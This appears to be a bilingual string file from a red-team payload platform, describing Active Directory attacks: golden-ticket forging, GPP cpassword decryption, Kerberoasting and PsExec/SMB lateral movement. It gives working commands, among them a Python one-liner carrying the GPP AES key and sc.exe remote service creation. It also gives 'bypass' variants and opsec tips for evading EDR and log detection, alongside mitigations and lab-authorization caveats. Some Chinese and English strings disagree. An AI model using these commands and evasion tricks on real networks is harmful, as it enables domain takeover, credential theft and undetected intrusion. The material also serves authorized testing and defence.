wafBypass.command: impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL | grep -i krbtgt

description.zh: 规避与域控的任何交互：对已落地快照离线解析；输出 krbtgt 行即成功。
description.en: Parse an already-landed snapshot offline with zero DC interaction; a krbtgt line in the output confirms success.

title.zh: 提取 krbtgt 账号哈希

description.zh: 运行 lsadump::lsa /inject /name:krbtgt；拿到 krbtgt 的 NTLM 与 AES 哈希即黄金票据的伪造原料入库。
description.en: Run lsadump::lsa /inject /name:krbtgt; the NTLM and AES hashes harvested are the raw material for forging golden tickets.

description.zh: 运行 whoami /user 取当前用户 SID 并去掉末位 RID；得到域 SID 即票据参数齐备，避免手工拼写出错。
description.en: Run whoami /user, take the user SID and strip the final RID; the domain SID completes the ticket parameters and avoids hand-crafted mistakes.

title.en: Forge and inject the golden ticket

description.zh: 用 kerberos::golden 传入域 SID 与 krbtgt 哈希伪造 Administrator 票据并注入当前会话；命令执行无报错即黄金票据铸造成功，可即刻访问域资源。
description.en: Forge an Administrator ticket with kerberos::golden using the domain SID and krbtgt hash, then inject; a clean run means the ticket is minted.

description.zh: 用 klist 查看注入票据，随后直接访问任意域内主机的共享资源；各主机均可成功登录即获得全域管理员级控制权。
description.en: Check klist, then access shares on arbitrary domain hosts; logging in everywhere proves domain-admin level control.

overview.zh: 黄金票据前置条件与检测审计覆盖 krbtgt 凭据滥用场景：针对已获取域 krbtgt NTLM 哈希的测试主体，验证能否伪造任意身份的 TGT 并通过 KDC 校验。验证维度涵盖 krbtgt 哈希提取、身份基线记录、黄金票据伪造注入与票据核验四步流程。
overview.en: Golden-Ticket Preconditions and Detection Audit covers krbtgt credential abuse: for a test principal holding the domain krbtgt NTLM hash, verify whether arbitrary TGTs can be forged and accepted by the KDC. Verification dimensions unfold across four steps: krbtgt hash extraction, identity baseline recording, golden ticket forging and injection, and ticket verification.

vulnerability.zh: 根因是 krbtgt 账户哈希是域内全部 TGT 的加密密钥，持有该哈希即可为任意用户伪造含任意组 SID 的 TGT，KDC 无法区分伪造与真实票据；krbtgt 密码长期不轮换时，该伪造能力在密码修改前无限期有效。
vulnerability.en: The root cause is that the krbtgt account hash is the signing key for every TGT in the domain, so holding it permits forging TGTs for any user with arbitrary group SIDs that the KDC cannot distinguish from genuine tickets; while the krbtgt password is never rotated, the forgery capability persists indefinitely.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用 mimikatz lsadump::lsa /inject 提取 krbtgt 的 NTLM 哈希与域 SID；第 2 步用 whoami /user 记录当前身份基线以便对比；第 3 步用 kerberos::golden 填入第 1 步取得的 SID 与哈希伪造 Administrator 黄金票据并 /ptt 注入；第 4 步用 klist 确认域管理员票据生效且可访问任意服务，即确认伪造链路成功。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 extracts the krbtgt NTLM hash and domain SID with mimikatz lsadump::lsa /inject; step 2 records the current identity baseline with whoami /user for comparison; step 3 forges an Administrator golden ticket with kerberos::golden using the SID and hash from step 1 and injects it via /ptt; step 4 verifies with klist that the domain-admin ticket is active and grants arbitrary service access, confirming the forgery chain. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
按两阶段轮换 krbtgt 密码（首次随机重置，间隔超过票据寿命后再次重置），监控 4768/4769 异常寿命或签名：
    Set-ADAccountPassword krbtgt -Reset -NewPassword (ConvertTo-SecureString -AsPlainText '<随机强口令>' -Force)
    # 间隔 >10 小时（默认 TGT 寿命）后重复执行一次完成第二阶段
mitigation.en: Rotate the krbtgt password in two passes (first reset to a random value, second after the ticket lifetime), and monitor 4768/4769 requests with abnormal lifetimes or signatures; the rotation is mandatory after any DC compromise. After the fix, tickets forged with the old hash must be rejected by the KDC.

An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

description.en: Uses Get-GPPPassword.py against the domain controller to automatically collect and decrypt all Group Policy Preference passwords.

opsecTips.en: Record recovered cpassword values in the report instead of keeping plaintext copies, and read SYSVOL through the normal domain channel rather than wide share scanning.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 绕过 PowerShell 模块加载特征（PowerView/Get-GPPPassword 告警）：原生 findstr 直接扫 SYSVOL。成功判据：输出含 cpassword 的策略 XML 行。
description.en: Evades PowerShell module-load signatures (PowerView/Get-GPPPassword alerts) by scanning SYSVOL with native findstr. Success: lines with cpassword from policy XMLs are output.

wafBypass.command: python3 -c "from Crypto.Cipher import AES;from base64 import b64decode;k=bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b');c=b64decode('{LAB_CPASSWORD}');print(AES.new(k,AES.MODE_CBC,iv=bytes(16)).decrypt(c)[:-c[-1]].decode())"

description.zh: 真·零工具依赖的本地解密：AES-256-CBC 使用公开的微软 GPP 固定密钥与全零 IV，在操作机本地解开 cpassword（仅 pycryptodome），全程不与域控建立连接，规避 impacket/PowerView 的出网与会话特征。判据：输出明文口令。
description.en: Truly zero-tool decryption of the collected cpassword: AES-256-CBC with the well-known Microsoft GPP key and a zero IV, run locally with nothing but pycryptodome and no domain-controller connection at all, evading outbound-session and tool-process signatures. Success: the plaintext password prints.

title.zh: 远程 SMB 直连抓取规避变体

description.zh: 绕过 PowerShell 递归枚举与盘符挂载产生的浏览日志：impacket 经独立 SMB 会话直接读取并解析策略文件。成功判据：返回 cpassword 明文集合。
description.en: Evades SMB-mount SYSVOL browsing logs by parsing policy files through remote interfaces. Success: a set of decrypted cpassword values returns.

title.zh: 定位 SYSVOL 组策略 XML
title.en: Locate group policy XML in SYSVOL

description.zh: 在域 SYSVOL 共享递归查找全部 XML 文件；输出组策略偏好文件清单即锁定可能携带 cpassword 字段的目标，任何域用户都可读该共享。
description.en: Recursively find XML files on the SYSVOL share; the Group Policy Preferences list marks targets likely carrying a cpassword field, readable by any domain user.

description.zh: 从 XML 中取出 cpassword 字段并用 gpp-decrypt 以微软公开的 AES 密钥解密；输出明文即还原历史本地管理员口令，可直接尝试远程登录。
description.en: Pull the cpassword value and decrypt it with gpp-decrypt using the public Microsoft AES key; the plaintext restores the old local-admin password for direct reuse.

attackChain.payload: python3 -c "from Crypto.Cipher import AES;from base64 import b64decode;k=bytes.fromhex('4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b');c=b64decode('{LAB_CPASSWORD}');print(AES.new(k,AES.MODE_CBC,iv=bytes(16)).decrypt(c)[:-c[-1]].decode())"

description.zh: 用 PowerView 的 Get-NetGPPPassword 自动扫描并解密组策略口令；直接输出用户名与明文即跳过手工解析，快速摸清口令遗留的覆盖范围。
description.en: Run Get-NetGPPPassword to auto-scan and decrypt; usernames with plaintext come out directly, mapping the leftover-password surface without manual parsing.

title.zh: 远程批量收割残留口令

description.zh: 用 Get-GPPPassword.py 连接域控自动抓取并解密全部组策略口令；批量拿到多组凭据后即可尝试口令复用，横向移动到同口令主机。
description.en: Point Get-GPPPassword.py at the DC to fetch and decrypt every stored password in bulk; the batch of credentials feeds password-reuse lateral movement.

overview.zh: 该 Payload 覆盖 GPP cpassword 遗留配置审计场景，检验 SYSVOL 中组策略偏好是否残留可解密口令。验证维度含 XML 检索、PowerView 提取、单值解密与域控批量抓取五步中的四类路径，对应第 1 至第 5 步。
overview.en: This payload covers GPP cpassword legacy-configuration auditing, testing whether Group Policy preferences in SYSVOL still hold decryptable passwords. Validation covers XML discovery, PowerView extraction, single-value decryption and domain-controller batch retrieval, mapped to steps 1 through 5.

vulnerability.zh: 根因在于组策略偏好历史版本使用公开 AES 密钥加密 cpassword 字段且补丁后旧文件残留：任何域用户读取 SYSVOL 即可还原历史本地管理员口令。
vulnerability.en: The root cause is legacy Group Policy preferences encrypting cpassword with a published AES key while unpatched files linger: any domain user reading SYSVOL can recover historical local-admin passwords.

exploitation.zh: 第 1 步在 SYSVOL 递归查找 XML 输出路径清单；第 2 步以 PowerShell 确认可读范围；第 3 步用 PowerView 的 Get-NetGPPPassword 提取用户名与明文；第 4 步用 gpp-decrypt 解密单个 cpassword 验证；第 5 步用 Get-GPPPassword.py 批量抓取。任一路径还原明文即确认遗留口令。占位符在全局变量菜单替换。
exploitation.en: In step 1, recursively find XML under SYSVOL printing paths. In step 2, confirm readability with PowerShell. In step 3, extract usernames and plaintext with PowerView's Get-NetGPPPassword. In step 4, decrypt a single cpassword with gpp-decrypt. In step 5, batch-retrieve with Get-GPPPassword.py. Any path recovering plaintext confirms the lingering password. Replace placeholders via the global variables menu.

mitigation.zh:
安装 KB2962486 后全量清除 SYSVOL 残留 cpassword，轮换曾用于组策略的本地管理员口令并审计 SYSVOL 全量文件：
    Get-ChildItem "\\corp.local\SYSVOL" -Recurse -Include *.xml |
      Select-String -Pattern "cpassword" -List | ForEach-Object { Remove-Item $_.Path -Force }
    Set-ADAccountPassword -Identity local-admin -Reset `
      -NewPassword (ConvertTo-SecureString -AsPlainText (New-Guid().Guid + "Xk9!") -Force)
    修复后重放第 1、5 步，检索应无 cpassword 残留且批量抓取为空。
mitigation.en: Install KB2962486 to purge historical cpassword values, rotate local passwords once used in GPO, and audit the full SYSVOL tree. After the fix, replay steps 1 and 5: no cpassword remnants should be found and batch retrieval returns empty.

review.rationale: N-0020 C2 回填 gpp-decrypt 解密命令（=execution 步4）。

title.en: Request and export service tickets with Impacket

description.zh: 用 Impacket GetUserSPNs.py 请求域内服务账号票据并输出可离线破解的哈希。
description.en: Uses Impacket GetUserSPNs.py to request domain service-account tickets and emit hashes for offline cracking.

description.zh: 用 Hashcat -m 13100 离线破解导出的票据；跑出明文口令即确认服务账号弱口令。
description.en: Crack the exported tickets offline with hashcat -m 13100; recovering a plaintext password confirms a weak service-account credential.

analysis.zh: Kerberoasting 单账号暴露验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: Kerberoasting Single-Account Exposure Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 导出的服务票据是可离线破解的凭据材料，破解会话结束后立即销毁票据文件与候选口令表；SPN 请求保持正常扫描节奏，避免域控 4769 事件激增触发告警。
opsecTips.en: Exported service tickets are crackable credential material — destroy ticket files and candidate wordlists as soon as the cracking session ends, and pace SPN requests so 4769 events on the domain controller stay near baseline.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

title.zh: RC4 定向请求规避变体

description.zh: 绕过全量 SPN 请求的批量告警（Kerberos 服务票据洪泛检测）：仅定向请求单账号 RC4 票据。成功判据：kerb.txt 含单账号可破解哈希。
description.en: Evades bulk-SPN request alerts (service-ticket flooding detection) by requesting only one targeted account's RC4 ticket. Success: kerb.txt contains one crackable hash.

description.zh: 绕过 etype23(RC4) 弱加密票据告警：请求 AES 票据（etype 0x11/0x12），事件侧为正常加密协商。成功判据：返回 AES 哈希且可离线破解。
description.en: Evades etype23 (RC4) weak-ticket alerts by requesting AES tickets (etype 0x11/0x12), which look like normal crypto negotiation. Success: an AES hash returns and cracks offline.

title.zh: 变体：经 GC 3268 通道枚举 SPN

description.zh: SPN 枚举可经全局目录 3268 端口的 LDAP 通道完成，减少对域控 389 的直接查询面；但服务票据申请（TGS-REQ）恒走 KDC 88 端口，此变体无法绕过对 88 的监控。成功判据：3268 返回 SPN 清单。
description.en: SPN enumeration can run over the global-catalog LDAP port 3268 to reduce direct queries to the DC, but ticket requests (TGS-REQ) always hit the KDC on port 88, so this variant does not evade port-88 monitoring. Success: the SPN list returns via 3268.

explanation.zh: 连接全局目录 3268 端口
explanation.en: connect to the global catalog on port 3268
bind as the querying domain account

title.zh: 枚举域内 SPN 服务账号

description.zh: 用 setspn 的全域查询列出全部 SPN 记录；输出 HTTP、MSSQL 等服务账号清单即锁定可申请票据的高价值目标，优先挑选高权限账号。
description.en: Query every SPN in the domain with setspn; the HTTP/MSSQL service account list marks the high-value targets whose tickets can be requested.

description.zh: 通过 .NET 的 KerberosRequestorSecurityToken 为目标 SPN 申请服务票据；命令执行后本机票据缓存新增 TGS 即拿到可离线破解的凭据材料。
description.en: Request a ticket for the target SPN via KerberosRequestorSecurityToken; a fresh TGS in the local cache is the offline-cracking material.

description.zh: 用 mimikatz 的 kerberos::list /export 导出缓存中的票据；当前目录生成 .kirbi 文件即完成凭据落盘，可拷回攻击机进入破解环节。
description.en: Export cached tickets with mimikatz kerberos::list /export; the .kirbi file appearing on disk is ready to copy back for cracking.

title.zh: 换用 Impacket 一体化通道
title.en: Switch to the Impacket all-in-one channel

description.zh: 用 GetUserSPNs.py 的 request 模式一条命令完成枚举与请求，直接输出可破解哈希；无需登录图形机，与前三步互为备份，出哈希即可继续。
description.en: Run GetUserSPNs.py -request to enumerate and fetch in one shot, printing crackable hashes directly; no desktop logon needed and it backs up the earlier steps.

title.zh: 离线破解服务账号口令

description.zh: 用 hashcat 的 13100 模式加载字典破解票据哈希；跑出明文口令即获得服务账号凭据，可横向移动到该账号注册的全部服务主机。
description.en: Crack the ticket hash with hashcat mode 13100; the recovered plaintext yields a service-account credential for lateral movement to every host running that SPN.

overview.zh: 该 Payload 覆盖 Kerberoasting 单账号暴露验证场景，检验域内服务账号口令强度与票据可离线破解性。验证维度含 SPN 枚举、票据申请、导出、Rubeus 统计、Impacket 请求与离线破解六步，对应第 1 至第 6 步。
overview.en: This payload covers Kerberoasting single-account exposure validation, testing domain service-account password strength and offline crackability of tickets. Validation covers SPN enumeration, ticket request, export, Rubeus statistics, Impacket request and offline cracking, mapped to steps 1 through 6.

vulnerability.zh: 根因在于 Kerberos 服务票据以服务账号口令派生密钥加密且任何域用户都可申请：弱口令服务账号的票据被导出后可离线穷举，口令一旦命中即获得该账号身份。
vulnerability.en: The root cause is Kerberos service tickets encrypted with keys derived from the service-account password and requestable by any domain user: tickets for weak-password accounts can be exported and brute-forced offline, and a hit grants that account's identity.

exploitation.zh: 第 1 步用 setspn 查询全部 SPN 列出服务账号；第 2 步以 .NET 请求目标 SPN 票据入缓存；第 3 步用 mimikatz 导出 .kirbi 文件；第 4 步以 Rubeus stats 统计可请求账号；第 5 步用 GetUserSPNs.py 输出可破解哈希；第 6 步以 hashcat 配字典破解，跑出口令即确认弱凭据。占位符在全局变量菜单替换；仅限授权实验域。
exploitation.en: In step 1, list service accounts by enumerating all SPNs with setspn. In step 2, request the target SPN ticket via .NET into cache. In step 3, export .kirbi files with mimikatz. In step 4, tally requestable accounts with Rubeus stats. In step 5, emit crackable hashes with GetUserSPNs.py. In step 6, crack with hashcat and a wordlist; a recovered password confirms weak credentials. Replace placeholders via the global variables menu; authorized lab domain only.

mitigation.zh:
服务账号改用 gMSA 或 25 位以上随机口令并强制 AES256，对 RC4 票据请求量与异常 TGS 申请建立告警：
    New-ADServiceAccount -Name svc_web -DNSHostName svc_web.corp.local `
      -PrincipalsAllowedToRetrieveManagedPassword "CORP\Tier0-Servers" -KerberosEncryptionType AES256
    Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769} |
      Where-Object { $_.Message -match "0x17" }        # RC4 etype 告警
    修复后重放第 6 步，弱口令应不再可破解且监控捕获第 2、5 步的申请行为。
mitigation.en: Move service accounts to gMSA or 25-plus-character random passwords, enable AES encryption, and alert on anomalous ticket request volume. After the fix, replay step 6: weak passwords should no longer crack, and monitoring should catch the step 2 and 5 requests.

review.rationale: N-0020 C3 回填 mimikatz kerberos::list /export 导出命令（=execution 步3，报告点名）。

description.zh: 以授权凭据经 SMB/ADMIN$ 部署服务执行命令，验证远程服务执行边界与对应检测信号。
description.en: Deploys and starts a service over SMB/ADMIN$ with authorized credentials to run commands on the remote host, exercising the remote-service execution boundary and its 7045 service-creation detection signal.

prerequisites.zh: 确认 PsExec/SMB 远程服务边界验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。
prerequisites.en: Confirm that the lab domain, host, account, component version, and stop conditions for PsExec and SMB Remote-Service Boundary Validation are authorized in writing and reversible.

prerequisites.zh: 准备正常基线、合成对象、唯一标记、回滚快照以及身份、系统和网络日志；任何写入、远程执行或凭据操作都必须属于当前隔离实验授权。
prerequisites.en: Prepare a normal baseline, synthetic object, unique marker, rollback snapshot, and identity, system, and network logs; every write, remote execution, or credential action must be within the current isolated-lab authorization.

title.en: PsExec and SMB Remote-Service Boundary Validation Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_PSEXEC_E_1 与蓝队日志；成功时获得目标交互式 shell 且 whoami 显示 SYSTEM（nt authority\system）上下文，蓝队可见 7045 服务创建事件。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_PSEXEC_E_1 with blue-team logs; an interactive shell on the target with whoami showing the lab user context, plus event 7045 service creation, confirms success.

title.en: PsExec and SMB Remote-Service Boundary Validation Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_PSEXEC_E_2 与蓝队日志；成功时以 NTLM 哈希通过认证并打开目标 shell，安全日志出现 4624 NTLM 登录。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_PSEXEC_E_2 with blue-team logs; authenticating with the NTLM hash and opening a target shell, with event 4624 NTLM logon, confirms success.

explanation.en: Describes how the parameter segment "-hashes" participates in this validation command.
NTLM hash value (LM:NTLM format — leave LM blank)

title.zh: 远程执行 whoami 命令
title.en: PsExec and SMB Remote-Service Boundary Validation Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_PSEXEC_E_3 与蓝队日志；成功时远程执行 whoami 并返回目标主机名与用户名输出。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_PSEXEC_E_3 with blue-team logs; remote whoami returning the target hostname and username confirms success.

title.zh: 原生 PsExec 拉起 cmd
title.en: PsExec and SMB Remote-Service Boundary Validation Reviewed Command 4

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_PSEXEC_E_4 与蓝队日志；成功时 PsExec 连接目标返回 cmd 交互界面，且临时服务创建后被清理。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_PSEXEC_E_4 with blue-team logs; PsExec returning a cmd session on the target with the temporary service created and cleaned up confirms success.

explanation.en: Describes how the parameter segment "-u" participates in this validation command.
Describes how the parameter segment "-p" participates in this validation command.

analysis.zh: PsExec/SMB 远程服务边界验证只有在精确版本与对象、当前主体、已审查命令输出、权威配置和服务端日志相互一致时才能确认。端口开放、工具成功、权限名称存在、状态码或单一事件只能作为线索；能力证明与漏洞结论必须分别记录。
analysis.en: PsExec and SMB Remote-Service Boundary Validation is confirmed only when the exact version and object, current principal, reviewed command output, authoritative configuration, and server-side logs agree. An open port, successful tool run, privilege name, status code, or single event is only a lead; capability proof and vulnerability conclusion must be recorded separately.

opsecTips.zh: 服务二进制落盘与 7045 事件是双检测点——复用 PSEXESVC 命名形态、实验后清理服务与文件；多主机串行执行避免并发告警风暴。
opsecTips.en: Service-binary drops and 7045 events are both detection points — mirror the PSEXESVC naming shape, clean up the service and files afterwards, and run hosts serially to avoid a concurrent alert storm.

opsecTips.zh: 发现超出授权的写操作、远程进程、账号变更、防护中断或非实验目标时立即停止，执行回滚并保存审计时间点。
opsecTips.en: Stop immediately, roll back, and preserve the audit timestamp on any write, remote process, account change, protection gap, or non-lab target outside the authorization.

description.zh: 服务名伪装规避变体 — 绕过对默认服务名（如 smbexec 的 BTOBTO、psexec 的随机字母串）的 EDR 特征：伪装为系统管理风格服务名。成功判据：半交互 shell 建立且服务名不在检测名单。
description.en: Evades EDR signatures on default random-caps service names by masquerading as a sysadmin-style name. Success: semi-interactive shell establishes with a service name off detection lists.

description.zh: 绕过 admin$ 二进制落盘检测（PSEXESVC.exe 落盘告警）：SMBExec 经服务批处理执行不落盘。成功判据：shell 可用且目标无新 EXE 落盘。
description.en: Evades admin$ binary drop detection (PSEXESVC.exe landing alerts) since SMBExec executes via service batches without dropping a binary. Success: shell works and no new EXE lands on the target.

title.zh: 原生 sc.exe 组合规避变体

wafBypass.command: sc \\{LAB_HOST} create W32TimeUpdate binPath= "cmd /c whoami > C:\Windows\Temp\o.txt" && sc \\{LAB_HOST} start W32TimeUpdate && sc \\{LAB_HOST} delete W32TimeUpdate

description.zh: 绕过 impacket 脚本流量指纹：全程原生 sc.exe 创建/启动/删除，动作分散于三个低噪操作。成功判据：服务启动成功且 o.txt 生成。
description.en: Evades impacket script traffic fingerprints by doing everything with native sc.exe create/start/delete spread across three low-noise operations. Success: service starts and o.txt appears.

title.zh: 口令登录建立远程执行

description.zh: 用 psexec.py 以域账号口令登录目标；返回 SYSTEM 交互 shell 即远程服务执行通道打通，可执行任意命令。
description.en: Log into the target with psexec.py using domain credentials; a SYSTEM interactive shell means the remote service execution channel is open.

description.zh: 改用 -hashes 传入 NTLM 哈希登录同批主机；无需明文口令拿到 shell 即哈希可复用，覆盖只有哈希的场景。
description.en: Switch to -hashes with the NTLM hash for the same fleet; shells without the plaintext password prove hash reuse and cover hash-only situations.

title.zh: 定向执行命令收割结果
title.en: Run targeted commands to harvest results

description.zh: 在登录命令后追加 whoami 等指令；回显 SYSTEM 上下文即确认执行身份，可批量替换为凭据收集与侦察命令。
description.en: Append commands like whoami after the login; a SYSTEM context echoed back confirms the execution identity and can be swapped for credential dump and recon commands.

title.zh: 原生 PsExec 落地横向

description.zh: 在跳板机用 PsExec.exe \目标 -u 域\账号 -p 口令 启动 cmd.exe；新 shell 属于目标主机即完成原生工具横向，动作仅表现为服务安装。
description.en: From the pivot host run PsExec.exe \\target -u domain\user -p password to launch cmd.exe; the new shell belonging to the target completes native lateral movement, visible only as service installation.

overview.zh: PsExec/SMB 远程服务边界验证覆盖 SMB 远程执行场景：针对拿到有效凭据或 NTLM 哈希的测试主体，验证能否经 445 端口在目标主机创建服务并执行命令。验证维度涵盖明文密码、哈希传递、远程单命令执行与原生 PsExec 四种入口。
overview.en: PsExec/SMB Remote-Service Boundary Validation covers SMB remote execution: for a test principal holding valid credentials or an NTLM hash, verify whether a service can be created on the target via port 445 to execute commands. Verification dimensions cover plaintext password, pass-the-hash, single remote command, and native PsExec entries.

vulnerability.zh: 根因是 SMB 服务与管理共享（ADMIN$）允许特权主体远程创建并启动服务，服务进程继承 SYSTEM 权限；弱口令、NTLM 哈希泄露或本地管理员凭据复用，使攻击者绕过交互式登录直接在目标侧执行任意命令。
vulnerability.en: The root cause is that the SMB service and the ADMIN$ share let privileged principals remotely create and start services whose processes inherit SYSTEM; weak passwords, leaked NTLM hashes, or reused local-admin credentials let an attacker execute arbitrary commands on the target without interactive logon.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步用实验账号密码建立 psexec 交互 shell，whoami 显示 SYSTEM（nt authority\system）上下文且目标侧出现 7045 服务创建事件即确认成功；第 2 步改用 -hashes 以 NTLM 哈希认证，目标记录 4624 NTLM 网络登录即确认哈希可用；第 3 步远程执行 whoami 验证命令回传；第 4 步用原生 PsExec.exe 复现并确认临时服务创建后被清理。LAB_* 占位符在全局变量菜单中替换为目标值。
exploitation.en: Use in Payload list order: step 1 establishes an interactive psexec shell with the lab account password — whoami returning the target context plus a 7045 service-creation event on the target confirms success; step 2 switches to -hashes for NTLM authentication — a 4624 NTLM logon recorded on the target confirms the hash works; step 3 executes whoami remotely to verify command return; step 4 replays with native PsExec.exe and confirms the temporary service is cleaned up. Replace LAB_* placeholders via the global variables menu.

mitigation.zh:
445 仅管理网段可达，强制 SMB 签名与 EPA，本地管理员隔离并以 LAPS 轮换，7045/4624 实时告警：
    Set-NetFirewallRule -DisplayName "File and Printer Sharing (SMB-In)" -RemoteAddress 10.0.10.0/24
    reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 1 /f
    Update-LapsADSchema
    Set-LapsADComputerSelfPermission -Identity "OU=Servers,DC=corp,DC=local"
    修复后用第 1、2 步样例回归，远程服务创建应被拒绝并触发告警。
mitigation.en: Restrict port 445 to the management segment, enable SMB signing and EPA, enforce local administrator isolation with LAPS rotation, and adopt tiered admin accounts; alert in real time on 7045 service creation and anomalous 4624 logons. After the fix, regress with the step 1 and step 2 samples: remote service creation must be denied and raise an alert.

review.rationale: N-0020 C1 回填 psexec.py 口令登录命令（=execution 步1）；N-0025 全步 LATERAL_LATERAL 标记去重。

name.zh: WMI 远程管理授权验证

description.zh: 通过 WMI（wmic/Invoke-CimMethod）远程执行管理操作，验证管理协议的授权与遥测覆盖。
description.en: Runs management operations remotely through WMI (wmic or Invoke-CimMethod) such as Win32_Process.Create, showing the protocol executes without dropping any file and detection depends on process-creation and WMI activity logging.

prerequisites.zh: 确认 WMI 远程管理授权验证 的实验域、主机、账号、组件版本和停止条件已书面授权且可回滚。

description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_WMI_E_2 with blue-team logs; entering a wmiexec interactive shell with normal command output confirms success.

title.en: WMI Remote-Management Authorization Validation Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_LATERAL_LATERAL_WMI_E_3 与蓝队日志；成功时以 NTLM 哈希完成 WMI 认证并取得交互 shell。
description.en: Run in the isolated authorization and correlate PAYLOADER_LATERAL_LATERAL_WMI_E_3 with blue-team logs; WMI authentication with the NTLM hash yielding an interactive shell confirms success.
